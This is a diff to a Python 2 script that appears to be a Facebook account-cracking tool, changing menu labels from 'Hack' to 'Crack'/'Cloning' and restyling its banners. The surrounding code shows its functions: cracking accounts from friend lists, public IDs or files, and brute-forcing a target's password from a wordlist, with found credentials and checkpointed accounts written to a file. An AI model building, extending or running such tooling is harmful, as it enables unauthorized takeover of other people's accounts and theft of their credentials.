@@ -189,9 +189,9 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m════Start Hacking"	
-	print "\033[1;32;40m[2] \033[1;33;40m════Update Rana"																														
-	print "\033[1;32;40m[0] \033[1;33;40m════Log out"
+	print "\033[1;32;40m[1] \033[1;33;40mStart Cloning"	
+	print "\033[1;32;40m[2] \033[1;33;40mUpdate fbw"																														
+	print "\033[1;32;40m[0] \033[1;33;40mLogout"
 	pilih()
 
 def pilih():
@@ -204,7 +204,7 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m●════════════════════◄►════════════════════════●\n"
+		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
@@ -228,11 +228,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40m════Hack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40m════Hack From Public IDs"
-	print "\x1b[1;32;40m[3] \033[1;33;40m════Hack Bruteforce"
-	print "\x1b[1;32;40m[4] \033[1;33;40m════Hack From File"
-	print "\x1b[1;32;40m[0] \033[1;33;40m════Back"
+	print "\x1b[1;32;40m[1] \033[1;33;40mCrack From Friend List"
+	print "\x1b[1;32;40m[2] \033[1;33;40mCrack From Public ID"
+	print "\x1b[1;32;40m[3] \033[1;33;40mTarget Bruteforce"
+	print "\x1b[1;32;40m[4] \033[1;33;40mCrack From File"
+	print "\x1b[1;32;40m[0] \033[1;33;40mBack"
 	pilih_super()
 
 def pilih_super():
@@ -294,11 +294,11 @@ def pilih_super():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print " \       033[1;31;47m⚔════════════════════════☠════════════════════════⚔"
+	print "\n\033[1;94m        ❈     \x1b[1;93mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
+	print " \033[1;31;40m●════════════════════════◄►════════════════════════●"
 
-	jalan('                         \033[1;91mCloning Started  Wait...')
-	print  "       \033[1;36;47m⚔════════════════════════☠════════════════════════⚔" 
+	jalan(' \033[1;93mCloning Started  Wait...')
+	print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●" 
 
 	def main(arg):
 		global cekpoint,oks
@@ -417,9 +417,7 @@ def pilih_super():
 	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
 	print """
-
-
-\033[1;31;40m ⚔════════════════════════☠════════════════════════⚔
+\033[1;31;40m ●════════════════════════◄►════════════════════════●
            """
 	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
 	super()
@@ -436,13 +434,13 @@ def brute():
     else:
         os.system('clear')
         print logo
-        print '\033[1;31;40m ⚔════════════════════════☠════════════════════════⚔'
+        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
         try:
             email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
             passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
-            print '\033[1;31;40m ⚔════════════════════════☠════════════════════════⚔'
+            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
@@ -469,7 +467,7 @@ def brute():
                             ceks.write(email + ' | ' + pw + '\n')
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
-                            print  "\033[1;36;40m ⚔════════════════════════☠════════════════════════⚔"
+                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
